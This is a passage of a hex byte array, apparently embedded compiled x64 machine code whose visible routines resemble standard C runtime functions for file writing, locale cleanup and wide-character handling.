0xf8, 0x4c, 0x63, 0xe1, 0x49, 0x8b, 0xd9, 0x4c, 0x8b, 0xf2, 0x45, 0x85, 0xc0, 0xf, 0x84, 0xd2, 0x2, 0x0, 0x0, 0x48, 0x85, 0xd2, 0x75, 0x37, 0x41, 0xc6, 0x41, 0x38, 0x1, 0x45, 0x33, 0xc0, 0x41, 0x89, 0x79, 0x34, 0x33, 0xd2, 0x41, 0xc6, 0x41, 0x30, 0x1, 0x33, 0xc9, 0x41, 0xc7, 0x41, 0x2c, 0x16, 0x0, 0x0, 0x0, 0x45, 0x33, 0xc9, 0x48, 0x89, 0x5c, 0x24, 0x28, 0x48, 0x89, 0x7c, 0x24, 0x20, 0xe8, 0x35, 0xaa, 0xff, 0xff, 0x83, 0xc8, 0xff, 0xe9, 0x98, 0x2, 0x0, 0x0, 0x49, 0x8b, 0xc4, 0x48, 0x8d, 0x15, 0xd7, 0xe3, 0x0, 0x0, 0x83, 0xe0, 0x3f, 0x49, 0x8b, 0xcc, 0x48, 0xc1, 0xf9, 0x6, 0x48, 0x89, 0x4d, 0xc8, 0x4c, 0x8d, 0x2c, 0xc0, 0x48, 0x8b, 0xc, 0xca, 0x42, 0xf, 0xbe, 0x74, 0xe9, 0x39, 0x8d, 0x46, 0xff, 0x3c, 0x1, 0x77, 0x9, 0x41, 0x8b, 0xc7, 0xf7, 0xd0, 0xa8, 0x1, 0x74, 0x93, 0x42, 0xf6, 0x44, 0xe9, 0x38, 0x20, 0x74, 0xe, 0x33, 0xd2, 0x41, 0x8b, 0xcc, 0x44, 0x8d, 0x42, 0x2, 0xe8, 0x65, 0x9, 0x0, 0x0, 0x41, 0x8b, 0xcc, 0x48, 0x89, 0x7d, 0xe0, 0xe8, 0x45, 0x3, 0x0, 0x0, 0x48, 0x8b, 0x55, 0xc8, 0x4c, 0x8d, 0x5, 0x7e, 0xe3, 0x0, 0x0, 0x85, 0xc0, 0xf, 0x84, 0x17, 0x1, 0x0, 0x0, 0x49, 0x8b, 0x4, 0xd0, 0x42, 0x38, 0x7c, 0xe8, 0x38, 0xf, 0x8d, 0x8, 0x1, 0x0, 0x0, 0x40, 0x38, 0x7b, 0x28, 0x75, 0x13, 0x48, 0x8b, 0xcb, 0xe8, 0x99, 0x9d, 0xff, 0xff, 0x48, 0x8b, 0x55, 0xc8, 0x4c, 0x8d, 0x5, 0x4e, 0xe3, 0x0, 0x0, 0x48, 0x8b, 0x43, 0x18, 0x48, 0x39, 0xb8, 0x38, 0x1, 0x0, 0x0, 0x75, 0xf, 0x49, 0x8b, 0x4, 0xd0, 0x42, 0x38, 0x7c, 0xe8, 0x39, 0xf, 0x84, 0xd3, 0x0, 0x0, 0x0, 0x49, 0x8b, 0xc, 0xd0, 0x48, 0x8d, 0x55, 0xf0, 0x4a, 0x8b, 0x4c, 0xe9, 0x28, 0xff, 0x15, 0x77, 0x32, 0x0, 0x0, 0x85, 0xc0, 0xf, 0x84, 0xad, 0x0, 0x0, 0x0, 0x40, 0x84, 0xf6, 0xf, 0x84, 0x81, 0x0, 0x0, 0x0, 0x40, 0xfe, 0xce, 0x40, 0x80, 0xfe, 0x1, 0xf, 0x87, 0x3b, 0x1, 0x0, 0x0, 0x4f, 0x8d, 0x24, 0x3e, 0x48, 0x89, 0x7d, 0xd0, 0x4d, 0x8b, 0xfe, 0x4d, 0x3b, 0xf4, 0xf, 0x83, 0x1d, 0x1, 0x0, 0x0, 0x8b, 0x75, 0xd4, 0x41, 0xf, 0xb7, 0x7, 0xf, 0xb7, 0xc8, 0x66, 0x89, 0x45, 0xf0, 0xe8, 0xb2, 0x8, 0x0, 0x0, 0xf, 0xb7, 0x4d, 0xf0, 0x66, 0x3b, 0xc1, 0x75, 0x36, 0x83, 0xc6, 0x2, 0x89, 0x75, 0xd4, 0x66, 0x83, 0xf9, 0xa, 0x75, 0x1b, 0xb9, 0xd, 0x0, 0x0, 0x0, 0xe8, 0x93, 0x8, 0x0, 0x0, 0xb9, 0xd, 0x0, 0x0, 0x0, 0x66, 0x3b, 0xc1, 0x75, 0x16, 0xff, 0xc6, 0x89, 0x75, 0xd4, 0xff, 0xc7, 0x49, 0x83, 0xc7, 0x2, 0x4d, 0x3b, 0xfc, 0xf, 0x83, 0xcd, 0x0, 0x0, 0x0, 0xeb, 0xb1, 0xff, 0x15, 0x55, 0x30, 0x0, 0x0, 0x89, 0x45, 0xd0, 0xe9, 0xbd, 0x0, 0x0, 0x0, 0x45, 0x8b, 0xcf, 0x48, 0x89, 0x5c, 0x24, 0x20, 0x4d, 0x8b, 0xc6, 0x48, 0x8d, 0x4d, 0xd0, 0x41, 0x8b, 0xd4, 0xe8, 0xea, 0xf4, 0xff, 0xff, 0xf2, 0xf, 0x10, 0x0, 0x8b, 0x78, 0x8, 0xe9, 0x9f, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x55, 0xc8, 0x4c, 0x8d, 0x5, 0x5f, 0xe2, 0x0, 0x0, 0x49, 0x8b, 0xc, 0xd0, 0x42, 0x38, 0x7c, 0xe9, 0x38, 0x7d, 0x51, 0x8b, 0xce, 0x40, 0x84, 0xf6, 0x74, 0x36, 0x83, 0xe9, 0x1, 0x74, 0x1d, 0x83, 0xf9, 0x1, 0xf, 0x85, 0x84, 0x0, 0x0, 0x0, 0x45, 0x8b, 0xcf, 0x48, 0x8d, 0x4d, 0xd0, 0x4d, 0x8b, 0xc6, 0x41, 0x8b, 0xd4, 0xe8, 0x31, 0xfa, 0xff, 0xff, 0xeb, 0xb5, 0x45, 0x8b, 0xcf, 0x48, 0x8d, 0x4d, 0xd0, 0x4d, 0x8b, 0xc6, 0x41, 0x8b, 0xd4, 0xe8, 0x39, 0xfb, 0xff, 0xff, 0xeb, 0xa1, 0x45, 0x8b, 0xcf, 0x48, 0x8d, 0x4d, 0xd0, 0x4d, 0x8b, 0xc6, 0x41, 0x8b, 0xd4, 0xe8, 0x5, 0xf9, 0xff, 0xff, 0xeb, 0x8d, 0x4a, 0x8b, 0x4c, 0xe9, 0x28, 0x4c, 0x8d, 0x4d, 0xd4, 0x33, 0xc0, 0x45, 0x8b, 0xc7, 0x48, 0x21, 0x44, 0x24, 0x20, 0x49, 0x8b, 0xd6, 0x48, 0x89, 0x45, 0xd0, 0x89, 0x45, 0xd8, 0xff, 0x15, 0x28, 0x31, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x9, 0xff, 0x15, 0x96, 0x2f, 0x0, 0x0, 0x89, 0x45, 0xd0, 0x8b, 0x7d, 0xd8, 0xf2, 0xf, 0x10, 0x45, 0xd0, 0xf2, 0xf, 0x11, 0x45, 0xe0, 0x48, 0x8b, 0x55, 0xc8, 0x4c, 0x8d, 0x5, 0xbb, 0xe1, 0x0, 0x0, 0x48, 0x8b, 0x45, 0xe0, 0x48, 0xc1, 0xe8, 0x20, 0x85, 0xc0, 0x75, 0x5d, 0x8b, 0x45, 0xe0, 0x85, 0xc0, 0x74, 0x2c, 0x83, 0xf8, 0x5, 0x75, 0x17, 0xc6, 0x43, 0x30, 0x1, 0xc7, 0x43, 0x2c, 0x9, 0x0, 0x0, 0x0, 0xc6, 0x43, 0x38, 0x1, 0x89, 0x43, 0x34, 0xe9, 0xa3, 0xfd, 0xff, 0xff, 0x8b, 0x4d, 0xe0, 0x48, 0x8b, 0xd3, 0xe8, 0x95, 0xa9, 0xff, 0xff, 0xe9, 0x93, 0xfd, 0xff, 0xff, 0x49, 0x8b, 0x4, 0xd0, 0x42, 0xf6, 0x44, 0xe8, 0x38, 0x40, 0x74, 0x6, 0x41, 0x80, 0x3e, 0x1a, 0x74, 0x1f, 0x83, 0x63, 0x34, 0x0, 0xc6, 0x43, 0x30, 0x1, 0xc7, 0x43, 0x2c, 0x1c, 0x0, 0x0, 0x0, 0xc6, 0x43, 0x38, 0x1, 0xe9, 0x69, 0xfd, 0xff, 0xff, 0x8b, 0x45, 0xe4, 0x2b, 0xc7, 0xeb, 0x2, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x68, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5b, 0x5d, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x30, 0x83, 0x64, 0x24, 0x20, 0x0, 0xb9, 0x8, 0x0, 0x0, 0x0, 0xe8, 0x7, 0xa4, 0xff, 0xff, 0x90, 0xbb, 0x3, 0x0, 0x0, 0x0, 0x89, 0x5c, 0x24, 0x24, 0x3b, 0x1d, 0x4f, 0xe5, 0x0, 0x0, 0x74, 0x6d, 0x48, 0x63, 0xfb, 0x48, 0x8b, 0x5, 0x4b, 0xe5, 0x0, 0x0, 0x48, 0x8b, 0xc, 0xf8, 0x48, 0x85, 0xc9, 0x75, 0x2, 0xeb, 0x54, 0x8b, 0x41, 0x14, 0xc1, 0xe8, 0xd, 0x24, 0x1, 0x74, 0x19, 0x48, 0x8b, 0xd, 0x2f, 0xe5, 0x0, 0x0, 0x48, 0x8b, 0xc, 0xf9, 0xe8, 0x12, 0x8, 0x0, 0x0, 0x83, 0xf8, 0xff, 0x74, 0x4, 0xff, 0x44, 0x24, 0x20, 0x48, 0x8b, 0x5, 0x16, 0xe5, 0x0, 0x0, 0x48, 0x8b, 0xc, 0xf8, 0x48, 0x83, 0xc1, 0x30, 0xff, 0x15, 0xa0, 0x2e, 0x0, 0x0, 0x48, 0x8b, 0xd, 0x1, 0xe5, 0x0, 0x0, 0x48, 0x8b, 0xc, 0xf9, 0xe8, 0xa0, 0xa9, 0xff, 0xff, 0x48, 0x8b, 0x5, 0xf1, 0xe4, 0x0, 0x0, 0x48, 0x83, 0x24, 0xf8, 0x0, 0xff, 0xc3, 0xeb, 0x87, 0xb9, 0x8, 0x0, 0x0, 0x0, 0xe8, 0xd2, 0xa3, 0xff, 0xff, 0x8b, 0x44, 0x24, 0x20, 0x48, 0x8b, 0x5c, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x30, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x8b, 0x41, 0x14, 0x48, 0x8b, 0xd9, 0xc1, 0xe8, 0xd, 0xa8, 0x1, 0x74, 0x27, 0x8b, 0x41, 0x14, 0xc1, 0xe8, 0x6, 0xa8, 0x1, 0x74, 0x1d, 0x48, 0x8b, 0x49, 0x8, 0xe8, 0x4e, 0xa9, 0xff, 0xff, 0xf0, 0x81, 0x63, 0x14, 0xbf, 0xfe, 0xff, 0xff, 0x33, 0xc0, 0x48, 0x89, 0x43, 0x8, 0x48, 0x89, 0x3, 0x89, 0x43, 0x10, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x48, 0x83, 0xec, 0x28, 0x83, 0xf9, 0xfe, 0x75, 0xd, 0xe8, 0x8e, 0xa8, 0xff, 0xff, 0xc7, 0x0, 0x9, 0x0, 0x0, 0x0, 0xeb, 0x42, 0x85, 0xc9, 0x78, 0x2e, 0x3b, 0xd, 0x24, 0xe4, 0x0, 0x0, 0x73, 0x26, 0x48, 0x63, 0xc9, 0x48, 0x8d, 0x15, 0x18, 0xe0, 0x0, 0x0, 0x48, 0x8b, 0xc1, 0x83, 0xe1, 0x3f, 0x48, 0xc1, 0xe8, 0x6, 0x48, 0x8d, 0xc, 0xc9, 0x48, 0x8b, 0x4, 0xc2, 0xf, 0xb6, 0x44, 0xc8, 0x38, 0x83, 0xe0, 0x40, 0xeb, 0x12, 0xe8, 0x4f, 0xa8, 0xff, 0xff, 0xc7, 0x0, 0x9, 0x0, 0x0, 0x0, 0xe8, 0x8, 0xa7, 0xff, 0xff, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x40, 0x48, 0x8b, 0x44, 0x24, 0x70, 0x48, 0x8b, 0xd9, 0x48, 0x8d, 0x4c, 0x24, 0x30, 0x48, 0x89, 0x44, 0x24, 0x20, 0xe8, 0x5f, 0xd, 0x0, 0x0, 0x48, 0x83, 0xf8, 0x4, 0x77, 0x1a, 0x8b, 0x54, 0x24, 0x30, 0xb9, 0xfd, 0xff, 0x0, 0x0, 0x81, 0xfa, 0xff, 0xff, 0x0, 0x0, 0xf, 0x47, 0xd1, 0x48, 0x85, 0xdb, 0x74, 0x3, 0x66, 0x89, 0x13, 0x48, 0x83, 0xc4, 0x40, 0x5b, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x6c, 0x24, 0x18, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x30, 0x48, 0x8b, 0x3a, 0x33, 0xc0, 0x4d, 0x8b, 0xe1, 0x49, 0x8b, 0xe8, 0x4c, 0x8b, 0xfa, 0x4c, 0x8b, 0xf1, 0x48, 0x85, 0xc9, 0xf, 0x84, 0xe7, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xd9, 0x4d, 0x85, 0xc0, 0xf, 0x84, 0xb0, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xac, 0x24, 0x80, 0x0, 0x0, 0x0, 0x38, 0x7, 0x75, 0x8, 0x41, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xeb, 0x1c, 0x38, 0x47, 0x1, 0x75, 0x8, 0x41, 0xb8, 0x2, 0x0, 0x0, 0x0, 0xeb, 0xf, 0x8a, 0x47, 0x2, 0xf6, 0xd8, 0x4d, 0x1b, 0xc0, 0x49, 0xf7, 0xd8, 0x49, 0x83, 0xc0, 0x3, 0x4d, 0x8b, 0xcc, 0x4c, 0x89, 0x6c, 0x24, 0x20, 0x48, 0x8b, 0xd7, 0x48, 0x8d, 0x4c, 0x24, 0x60, 0xe8, 0xb6, 0xc, 0x0, 0x0, 0x48, 0x8b, 0xd0, 0x48, 0x83, 0xf8, 0xff, 0x74, 0x7b, 0x33, 0xc0, 0x48, 0x85, 0xd2, 0x74, 0x6c, 0x8b, 0x4c, 0x24, 0x60, 0x81, 0xf9, 0xff, 0xff, 0x0, 0x0, 0x76, 0x3b, 0x48, 0x83, 0xfd, 0x1, 0x76, 0x49, 0x81, 0xc1, 0x0, 0x0, 0xff, 0xff, 0x41, 0xb8, 0x0, 0xd8, 0x0, 0x0, 0x8b, 0xc1, 0x89, 0x4c, 0x24, 0x60, 0xc1, 0xe8, 0xa, 0x48, 0xff, 0xcd, 0x66, 0x41, 0xb, 0xc0, 0x66, 0x89, 0x3, 0xb8, 0xff, 0x3, 0x0, 0x0, 0x66, 0x23, 0xc8, 0x48, 0x83, 0xc3, 0x2, 0xb8, 0x0, 0xdc, 0x0, 0x0, 0x66, 0xb, 0xc8, 0x33, 0xc0, 0x66, 0x89, 0xb, 0x48, 0x3, 0xfa, 0x48, 0x83, 0xc3, 0x2, 0x48, 0x83, 0xed, 0x1, 0xf, 0x85, 0x58, 0xff, 0xff, 0xff, 0x49, 0x2b, 0xde, 0x49, 0x89, 0x3f, 0x48, 0xd1, 0xfb, 0x48, 0x8b, 0xc3, 0xe9, 0x8c, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xf8, 0x66, 0x89, 0x3, 0xeb, 0xe7, 0x49, 0x89, 0x3f, 0x41, 0xc6, 0x45, 0x30, 0x1, 0x41, 0xc7, 0x45, 0x2c, 0x2a, 0x0, 0x0, 0x0, 0xeb, 0x6e, 0x48, 0x8b, 0xac, 0x24, 0x80, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x38, 0x7, 0x75, 0x8, 0x41, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xeb, 0x1c, 0x38, 0x47, 0x1, 0x75, 0x8, 0x41, 0xb8, 0x2, 0x0, 0x0, 0x0, 0xeb, 0xf, 0x8a, 0x47, 0x2, 0xf6, 0xd8, 0x4d, 0x1b, 0xc0, 0x49, 0xf7, 0xd8, 0x49, 0x83, 0xc0, 0x3, 0x4d, 0x8b, 0xcc, 0x48, 0x89, 0x6c, 0x24, 0x20, 0x48, 0x8b, 0xd7, 0x33, 0xc9, 0xe8, 0xdb, 0xb, 0x0, 0x0, 0x48, 0x83, 0xf8, 0xff, 0x74, 0x18, 0x48, 0x85, 0xc0, 0x74, 0x8e, 0x48, 0x83, 0xf8, 0x4, 0x75, 0x3, 0x48, 0xff, 0xc3, 0x48, 0x3, 0xf8, 0x48, 0xff, 0xc3, 0x33, 0xc0, 0xeb, 0xa8, 0xc6, 0x45, 0x30, 0x1, 0xc7, 0x45, 0x2c, 0x2a, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc8, 0xff, 0x48, 0x8b, 0x5c, 0x24, 0x68, 0x48, 0x8b, 0x6c, 0x24, 0x70, 0x48, 0x83, 0xc4, 0x30, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x85, 0xc9, 0xf, 0x84, 0x0, 0x1, 0x0, 0x0, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0x49, 0x18, 0x48, 0x3b, 0xd, 0x18, 0xd4, 0x0, 0x0, 0x74, 0x5, 0xe8, 0xc9, 0xa6, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x20, 0x48, 0x3b, 0xd, 0xe, 0xd4, 0x0, 0x0, 0x74, 0x5, 0xe8, 0xb7, 0xa6, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x28, 0x48, 0x3b, 0xd, 0x4, 0xd4, 0x0, 0x0, 0x74, 0x5, 0xe8, 0xa5, 0xa6, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x30, 0x48, 0x3b, 0xd, 0xfa, 0xd3, 0x0, 0x0, 0x74, 0x5, 0xe8, 0x93, 0xa6, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x38, 0x48, 0x3b, 0xd, 0xf0, 0xd3, 0x0, 0x0, 0x74, 0x5, 0xe8, 0x81, 0xa6, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x40, 0x48, 0x3b, 0xd, 0xe6, 0xd3, 0x0, 0x0, 0x74, 0x5, 0xe8, 0x6f, 0xa6, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x48, 0x48, 0x3b, 0xd, 0xdc, 0xd3, 0x0, 0x0, 0x74, 0x5, 0xe8, 0x5d, 0xa6, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x68, 0x48, 0x3b, 0xd, 0xea, 0xd3, 0x0, 0x0, 0x74, 0x5, 0xe8, 0x4b, 0xa6, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x70, 0x48, 0x3b, 0xd, 0xe0, 0xd3, 0x0, 0x0, 0x74, 0x5, 0xe8, 0x39, 0xa6, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x78, 0x48, 0x3b, 0xd, 0xd6, 0xd3, 0x0, 0x0, 0x74, 0x5, 0xe8, 0x27, 0xa6, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0x80, 0x0, 0x0, 0x0, 0x48, 0x3b, 0xd, 0xc9, 0xd3, 0x0, 0x0, 0x74, 0x5, 0xe8, 0x12, 0xa6, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0x88, 0x0, 0x0, 0x0, 0x48, 0x3b, 0xd, 0xbc, 0xd3, 0x0, 0x0, 0x74, 0x5, 0xe8, 0xfd, 0xa5, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0x90, 0x0, 0x0, 0x0, 0x48, 0x3b, 0xd, 0xaf, 0xd3, 0x0, 0x0, 0x74, 0x5, 0xe8, 0xe8, 0xa5, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0x48, 0x85, 0xc9, 0x74, 0x66, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0x9, 0x48, 0x3b, 0xd, 0xf9, 0xd2, 0x0, 0x0, 0x74, 0x5, 0xe8, 0xc2, 0xa5, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x8, 0x48, 0x3b, 0xd, 0xef, 0xd2, 0x0, 0x0, 0x74, 0x5, 0xe8, 0xb0, 0xa5, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x10, 0x48, 0x3b, 0xd, 0xe5, 0xd2, 0x0, 0x0, 0x74, 0x5, 0xe8, 0x9e, 0xa5, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x58, 0x48, 0x3b, 0xd, 0x1b, 0xd3, 0x0, 0x0, 0x74, 0x5, 0xe8, 0x8c, 0xa5, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x60, 0x48, 0x3b, 0xd, 0x11, 0xd3, 0x0, 0x0, 0x74, 0x5, 0xe8, 0x7a, 0xa5, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x3c, 0xd1, 0x48, 0x8b, 0xd9, 0x48, 0x3b, 0xcf, 0x74, 0x11, 0x48, 0x8b, 0xb, 0xe8, 0x56, 0xa5, 0xff, 0xff, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x3b, 0xdf, 0x75, 0xef, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x85, 0xc9, 0xf, 0x84, 0xfe, 0x0, 0x0, 0x0, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x56, 0x48, 0x83, 0xec, 0x20, 0xbd, 0x7, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xd9, 0x8b, 0xd5, 0xe8, 0xa5, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x4b, 0x38, 0x8b, 0xd5, 0xe8, 0x9a, 0xff, 0xff, 0xff, 0x8d, 0x75, 0x5, 0x8b, 0xd6, 0x48, 0x8d, 0x4b, 0x70, 0xe8, 0x8c, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x8b, 0xd0, 0x0, 0x0, 0x0, 0x8b, 0xd6, 0xe8, 0x7e, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x8b, 0x30, 0x1, 0x0, 0x0, 0x8d, 0x55, 0xfb, 0xe8, 0x6f, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0x40, 0x1, 0x0, 0x0, 0xe8, 0xd7, 0xa4, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0x48, 0x1, 0x0, 0x0, 0xe8, 0xcb, 0xa4, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0x50, 0x1, 0x0, 0x0, 0xe8, 0xbf, 0xa4, 0xff, 0xff, 0x48, 0x8d, 0x8b, 0x60, 0x1, 0x0, 0x0, 0x8b, 0xd5, 0xe8, 0x3d, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x8b, 0x98, 0x1, 0x0, 0x0, 0x8b, 0xd5, 0xe8, 0x2f, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x8b, 0xd0, 0x1, 0x0, 0x0, 0x8b, 0xd6, 0xe8, 0x21, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x8b, 0x30, 0x2, 0x0, 0x0, 0x8b, 0xd6, 0xe8, 0x13, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x8b, 0x90, 0x2, 0x0, 0x0, 0x8d, 0x55, 0xfb, 0xe8, 0x4, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0xa0, 0x2, 0x0, 0x0, 0xe8, 0x6c, 0xa4, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0xa8, 0x2, 0x0, 0x0, 0xe8, 0x60, 0xa4, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0xb0, 0x2, 0x0, 0x0, 0xe8, 0x54, 0xa4, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0xb8, 0x2, 0x0, 0x0, 0xe8, 0x48, 0xa4, 0xff, 0xff, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5e, 0xc3, 0x33, 0xc0, 0x38, 0x1, 0x74, 0xe, 0x48, 0x3b, 0xc2, 0x74, 0x9, 0x48, 0xff, 0xc0, 0x80, 0x3c, 0x8, 0x0, 0x75, 0xf2, 0xc3, 0xcc, 0xcc, 0xcc, 0x4c, 0x8b, 0xda, 0x4c, 0x8b, 0xd1, 0x4d, 0x85, 0xc0, 0x75, 0x3, 0x33, 0xc0, 0xc3, 0x41, 0xf, 0xb7, 0xa, 0x4d, 0x8d, 0x52, 0x2, 0x41, 0xf, 0xb7, 0x13, 0x4d, 0x8d, 0x5b, 0x2, 0x8d, 0x41, 0xbf, 0x83, 0xf8, 0x19, 0x44, 0x8d, 0x49, 0x20, 0x8d, 0x42, 0xbf, 0x44, 0xf, 0x47, 0xc9, 0x83, 0xf8, 0x19, 0x8d, 0x4a, 0x20, 0x41, 0x8b, 0xc1, 0xf, 0x47, 0xca, 0x2b, 0xc1, 0x75, 0xb, 0x45, 0x85, 0xc9, 0x74, 0x6, 0x49, 0x83, 0xe8, 0x1, 0x75, 0xc4, 0xc3, 0xcc, 0x8b, 0x5, 0x56, 0xdf, 0x0, 0x0, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x30, 0x48, 0x63, 0xf9, 0x49, 0x8b, 0xd9, 0x8b, 0xcf, 0x41, 0x8b, 0xf0, 0x48, 0x8b, 0xea, 0xe8, 0x91, 0xeb, 0xff, 0xff, 0x48, 0x83, 0xf8, 0xff, 0x75, 0x11, 0xc6, 0x43, 0x30, 0x1, 0xc7, 0x43, 0x2c, 0x9, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc8, 0xff, 0xeb, 0x56, 0x44, 0x8b, 0xce, 0x4c, 0x8d, 0x44, 0x24, 0x20, 0x48, 0x8b, 0xd5, 0x48, 0x8b, 0xc8, 0xff, 0x15, 0xea, 0x29, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x12, 0xff, 0x15, 0x40, 0x28, 0x0, 0x0, 0x8b, 0xc8, 0x48, 0x8b, 0xd3, 0xe8, 0x8a, 0xa2, 0xff, 0xff, 0xeb, 0xd0, 0x48, 0x8b, 0x44, 0x24, 0x20, 0x48, 0x83, 0xf8, 0xff, 0x74, 0xc5, 0x48, 0x8b, 0xd7, 0x4c, 0x8d, 0x5, 0x5f, 0xda, 0x0, 0x0, 0x83, 0xe2, 0x3f, 0x48, 0x8b, 0xcf, 0x48, 0xc1, 0xf9, 0x6, 0x48, 0x8d, 0x14, 0xd2, 0x49, 0x8b, 0xc, 0xc8, 0x80, 0x64, 0xd1, 0x38, 0xfd, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x6c, 0x24, 0x48, 0x48, 0x8b, 0x74, 0x24, 0x50, 0x48, 0x83, 0xc4, 0x30, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0xe9, 0x4f, 0xff, 0xff, 0xff, 0xcc, 0xcc, 0xcc, 0x66, 0x89, 0x4c, 0x24, 0x8, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x8e, 0x9, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x1f, 0x4c, 0x8d, 0x44, 0x24, 0x38, 0xba, 0x1, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x4c, 0x24, 0x30, 0xe8, 0xe6, 0x9, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x7, 0xf, 0xb7, 0x44, 0x24, 0x30, 0xeb, 0x5, 0xb8, 0xff, 0xff, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x10, 0x48, 0x89, 0x48, 0x8, 0x57, 0x48, 0x83, 0xec, 0x30, 0x48, 0x8b, 0xfa, 0x48, 0x8b, 0xd9, 0x48, 0x85, 0xc9, 0x75, 0x2e, 0xc6, 0x42, 0x30, 0x1, 0xc7, 0x42, 0x2c, 0x16, 0x0, 0x0, 0x0, 0x48, 0x89, 0x50, 0xf0, 0x48, 0x21, 0x48, 0xe8, 0x45, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0xe8, 0xfd, 0x9f, 0xff, 0xff, 0x83, 0xc8, 0xff, 0x48, 0x8b, 0x5c, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x30, 0x5f, 0xc3, 0x8b, 0x41, 0x14, 0xc1, 0xe8, 0xc, 0x24, 0x1, 0x74, 0x7, 0xe8, 0x44, 0xc, 0x0, 0x0, 0xeb, 0xe1, 0xe8, 0x35, 0xcf, 0xff, 0xff, 0x90, 0x48, 0x8b, 0xd7, 0x48, 0x8b, 0xcb, 0xe8, 0x11, 0x0, 0x0, 0x0, 0x8b, 0xf8, 0x48, 0x8b, 0xcb, 0xe8, 0x2b, 0xcf, 0xff, 0xff, 0x8b, 0xc7, 0xeb, 0xc5, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x70, 0x10, 0x57, 0x48, 0x83, 0xec, 0x30, 0x48, 0x8b, 0xfa, 0x48, 0x8b, 0xd9, 0x48, 0x85, 0xc9, 0x75, 0x25, 0x48, 0x89, 0x50, 0xf0, 